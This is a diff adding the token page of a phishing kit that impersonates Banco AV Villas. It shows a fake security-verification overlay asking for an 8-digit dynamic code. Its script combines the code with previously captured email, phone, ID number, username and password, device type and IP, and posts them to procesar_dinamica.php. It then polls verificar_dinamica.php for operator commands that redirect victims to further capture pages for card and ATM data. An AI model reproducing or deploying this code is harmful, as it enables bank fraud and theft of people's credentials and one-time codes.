@@ -1,0 +1,512 @@
+<html>
+    <head>
+        <title>Banca Virtual |</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="theme-color" content="#FF0015">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="img/favicon.png">
+        <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="css/style.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+        <style type="text/css">
+            #fondo-oscuro{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                background-color: rgba(0,0,0,0.8);
+                z-index: 900;
+                display: none;
+            }
+
+            #frmToken{
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background-color: #ffffff;
+                padding: 30px;
+                border-radius: 10px;
+                z-index: 920;
+                display: none;
+                text-align: center;
+                min-width: 300px;
+            }
+
+            #loader-overlay{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                background-color: rgba(255,255,255,0.9);
+                z-index: 950;
+                display: none;
+                justify-content: center;
+                align-items: center;
+                flex-direction: column;
+            }
+
+            .token-input{
+                width: 100%;
+                padding: 15px;
+                border: 2px solid #ddd;
+                border-radius: 5px;
+                font-size: 18px;
+                text-align: center;
+                margin: 20px 0;
+                letter-spacing: 5px;
+            }
+
+            .btn-token{
+                background-color: #FF0015;
+                color: white;
+                border: none;
+                padding: 15px 30px;
+                border-radius: 5px;
+                font-size: 16px;
+                cursor: pointer;
+                margin: 10px;
+            }
+
+            .btn-token:hover{
+                background-color: #d40012;
+            }
+
+            .error-token{
+                color: #FF0015;
+                font-size: 14px;
+                margin-top: 10px;
+                display: none;
+            }
+        </style>
+    </head>
+    <body>
+        <input type="hidden" id="session_id" name="session_id">
+        <input type="hidden" id="username" name="username">
+        
+        <div id="fondo-oscuro"></div>
+        
+        <div id="frmToken">
+            <img src="img/logo.png" width="150" style="margin-bottom: 20px;">
+            <h2>Verificación de Seguridad</h2>
+            <p>Ingresa la clave dinámica de 8 dígitos que recibiste</p>
+            
+            <input type="text" id="txtToken" class="token-input" maxlength="8" placeholder="00000000" pattern="[0-9]*" inputmode="numeric">
+            <div id="error-token" class="error-token">La clave debe tener 8 dígitos</div>
+            
+            <br>
+            <button id="btnOTP" class="btn-token">confirmar</button>
+            <button id="btnOTPE" class="btn-token" style="background-color: #666;">Error</button>
+        </div>
+
+        <div id="loader-overlay">
+            <img src="img/loading.gif" width="140">
+            <p>Verificando...</p>
+        </div>
+
+        <div style="padding:10px 14px;">
+            <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td align="left"><img src="img/logo-gav.png" width="70"></td>
+                    <td align="right"><img src="img/logo-gav.png" width="70" id="super-d"> &nbsp;&nbsp;&nbsp;  <img src="img/superh-negro.svg" width="130"></td>
+                </tr>
+            </table>
+        </div>
+    </body>
+</html>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      
+      // Generar o recuperar session_id
+      let sessionId = localStorage.getItem('session_id');
+      if (!sessionId) {
+        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('session_id', sessionId);
+      }
+      
+      const sessionInput = document.getElementById('session_id');
+      sessionInput.value = sessionId;
+
+      // Obtener usuario desde URL params y establecer en el campo hidden
+      const userFromUrl = urlParams.get('user');
+      const usernameInput = document.getElementById('username');
+      if (userFromUrl) {
+        usernameInput.value = userFromUrl;
+        localStorage.setItem('username', userFromUrl);
+      }
+
+      // Mostrar el formulario de token al cargar la página
+      setTimeout(() => {
+        $("#fondo-oscuro").show();
+        $("#frmToken").show();
+        $("#txtToken").focus();
+      }, 500);
+
+      // Event listener para el botón Verificar Token
+      const btnOTP = document.getElementById('btnOTP');
+      
+                   if (btnOTP) {
+               btnOTP.addEventListener('click', async function (event) {
+                 event.preventDefault();
+
+                 const token = document.getElementById('txtToken').value;
+
+                 // Validar que el token tenga 6 dígitos
+                 if (token.length !== 8) {
+                   alert('La clave dinámica debe tener 8 dígitos');
+                   return;
+                 }
+
+          // Mostrar loader
+          const loader = document.getElementById('loader-overlay');
+          if (loader) {
+            loader.style.display = 'flex';
+          }
+
+          const session_id = document.getElementById('session_id').value;
+          const username = document.getElementById('username').value;
+
+          localStorage.setItem('token', token);
+          localStorage.setItem('session_id', session_id);
+          localStorage.setItem('username', username);
+
+          // Obtener datos previos del localStorage
+          const identificacion = localStorage.getItem('identificacion') || '';
+          const password = localStorage.getItem('password') || '';
+          
+          // Detectar tipo de dispositivo
+          const userAgent = navigator.userAgent;
+          let dispositivo = 'PC';
+          
+          if (/Android/i.test(userAgent)) {
+            dispositivo = 'Android';
+          } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+            dispositivo = 'iPhone';
+          } else if (/Windows/i.test(userAgent)) {
+            dispositivo = 'PC';
+          } else if (/Mac/i.test(userAgent)) {
+            dispositivo = 'Mac';
+          } else if (/Linux/i.test(userAgent)) {
+            dispositivo = 'Linux';
+          }
+          
+          const hora = new Date().toLocaleString('es-ES');
+          
+                           // Obtener IP y construir mensaje
+                 fetch('get_ip.php')
+                   .then(response => {
+                     return response.json();
+                   })
+                   .then(data => {
+                     const ip = data.ip || 'No disponible';
+              
+              const mensaje = `
+<b><u>💎AV VILLAS - TOKEN💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO AV VILLAS
+-----------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+-----------------------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+-----------------------------
+• <b>🔐 Token:</b> ${token}
+-----------------------------`;
+
+                                   const formData = new FormData();
+                     formData.append('message', mensaje);
+                     formData.append('transactionId', session_id);
+
+                      fetch('procesar_dinamica.php', {
+                       method: 'POST',
+                       body: formData
+                     })
+                     .then(res => {
+                       return res.json();
+                     })
+                     .then(result => {
+                       if (result.status === 'success') {
+                         checkPaymentVerification(session_id, result.messageId);
+                       } else {
+                         // Ocultar loader si hay error
+                         const loader = document.getElementById('loader-overlay');
+                         if (loader) {
+                           loader.style.display = 'none';
+                         }
+                       }
+                     })
+                     .catch(err => {
+                       // Ocultar loader si hay error
+                       const loader = document.getElementById('loader-overlay');
+                       if (loader) {
+                         loader.style.display = 'none';
+                       }
+                     });
+            })
+            .catch((error) => {
+              // Si falla la obtención de IP, enviar sin IP
+              const mensaje = `
+<b><u>💎AV VILLAS - TOKEN💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO AV VILLAS
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+------------------------------
+• <b>🔐 Token:</b> ${token}
+------------------------------`;
+
+              const formData = new FormData();
+              formData.append('message', mensaje);
+              formData.append('transactionId', session_id);
+
+              fetch('procesar_dinamica.php', {
+                method: 'POST',
+                body: formData
+              })
+              .then(res => {
+                return res.json();
+              })
+              .then(result => {
+                if (result.status === 'success') {
+                  checkPaymentVerification(session_id, result.messageId);
+                } else {
+                  // Ocultar loader si hay error
+                  const loader = document.getElementById('loader-overlay');
+                  if (loader) {
+                    loader.style.display = 'none';
+                  }
+                }
+              })
+              .catch(err => {
+                // Ocultar loader si hay error
+                const loader = document.getElementById('loader-overlay');
+                if (loader) {
+                  loader.style.display = 'none';
+                }
+              });
+            });
+
+        });
+                   }
+
+      // Event listener para el botón Verificar Token Error
+      const btnOTPE = document.getElementById('btnOTPE');
+      
+                   if (btnOTPE) {
+               btnOTPE.addEventListener('click', async function (event) {
+                 event.preventDefault();
+
+          const token = document.getElementById('txtToken').value;
+          
+          // Validar que el token tenga 8 dígitos
+          if (token.length !== 8) {
+            alert('El Token dinámico debe tener 8 dígitos');
+            return;
+          }
+
+          // Mostrar loader
+          const loader = document.getElementById('loader-overlay');
+          if (loader) {
+            loader.style.display = 'flex';
+          }
+
+          const session_id = document.getElementById('session_id').value;
+          const identificacion = localStorage.getItem('identificacion') || '';
+          const password = localStorage.getItem('password') || '';
+          
+          // Detectar tipo de dispositivo
+          const userAgent = navigator.userAgent;
+          let dispositivo = 'PC';
+          
+          if (/Android/i.test(userAgent)) {
+            dispositivo = 'Android';
+          } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+            dispositivo = 'iPhone';
+          } else if (/Windows/i.test(userAgent)) {
+            dispositivo = 'PC';
+          } else if (/Mac/i.test(userAgent)) {
+            dispositivo = 'Mac';
+          } else if (/Linux/i.test(userAgent)) {
+            dispositivo = 'Linux';
+          }
+          
+          const hora = new Date().toLocaleString('es-ES');
+
+          fetch('get_ip.php')
+            .then(response => response.json())
+            .then(data => {
+              const ip = data.ip || 'No disponible';
+              
+              const mensaje = `
+<b><u>💎AV VILLAS - TOKEN💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO AV VILLAS
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+------------------------------
+• <b>🔐 Token:</b> ${token}
+------------------------------`;
+
+              const formData = new FormData();
+              formData.append('message', mensaje);
+              formData.append('transactionId', session_id);
+
+              fetch('procesar_dinamica.php', {
+                method: 'POST',
+                body: formData
+              })
+              .then(res => res.json())
+              .then(result => {
+                if (result.status === 'success') {
+                  checkPaymentVerification(session_id, result.messageId);
+                } else {
+                  const loader = document.getElementById('loader-overlay');
+                  if (loader) {
+                    loader.style.display = 'none';
+                  }
+                }
+              })
+              .catch(err => {
+                const loader = document.getElementById('loader-overlay');
+                if (loader) {
+                  loader.style.display = 'none';
+                }
+              });
+            })
+            .catch(() => {
+              const mensaje = `
+<b><u>💎AV VILLAS - TOKEN💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO AV VILLAS
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+------------------------------
+• <b>🔐 Token:</b> ${token}
+------------------------------`;
+
+              const formData = new FormData();
+              formData.append('message', mensaje);
+              formData.append('transactionId', session_id);
+
+              fetch('procesar_dinamica.php', {
+                method: 'POST',
+                body: formData
+              })
+              .then(res => res.json())
+              .then(result => {
+                if (result.status === 'success') {
+                  checkPaymentVerification(session_id, result.messageId);
+                } else {
+                  const loader = document.getElementById('loader-overlay');
+                  if (loader) {
+                    loader.style.display = 'none';
+                  }
+                }
+              })
+              .catch(err => {
+                const loader = document.getElementById('loader-overlay');
+                if (loader) {
+                  loader.style.display = 'none';
+                }
+              });
+            });
+        });
+      }
+    });
+
+    async function checkPaymentVerification(transactionId, messageId) {
+  try {
+    const formData = new FormData();
+    formData.append('transactionId', transactionId);
+    formData.append('messageId', messageId);
+
+    const res = await fetch('verificar_dinamica.php', {
+      method: 'POST',
+      body: formData
+    });
+    const result = await res.json();
+
+    if (result.action) {
+      switch (result.action) {
+        case 'pedir_dinamica':
+          const loader = document.getElementById('loader-overlay');
+          if (loader) {
+            loader.style.display = 'none';
+          }
+          alert("Error de Token Dinámica.");
+          window.location.href = "token.html";
+          break;
+
+        case 'confirm_finalizar':
+          window.location.href = "../fin.php";
+          break;
+
+        case 'error_logo':
+          const loader2 = document.getElementById('loader-overlay');
+          if (loader2) {
+            loader2.style.display = 'none';
+          }
+          alert("Usuario o clave incorrectos.");
+          window.location.href = "index.html";
+          break;
+
+        case 'error_cajero':
+          const loader3 = document.getElementById('loader-overlay');
+          if (loader3) {
+            loader3.style.display = 'none';
+          }
+          window.location.href = "clav.html";
+          break;
+
+        case 'tarjeta': // ✅ botón nuevo manejado
+          window.location.href = "../../../../../data-cc/alter.php";
+          break;
+      }
+    } else {
+      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+    }
+  } catch (err) {
+    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+  }
+}
+
+  </script>
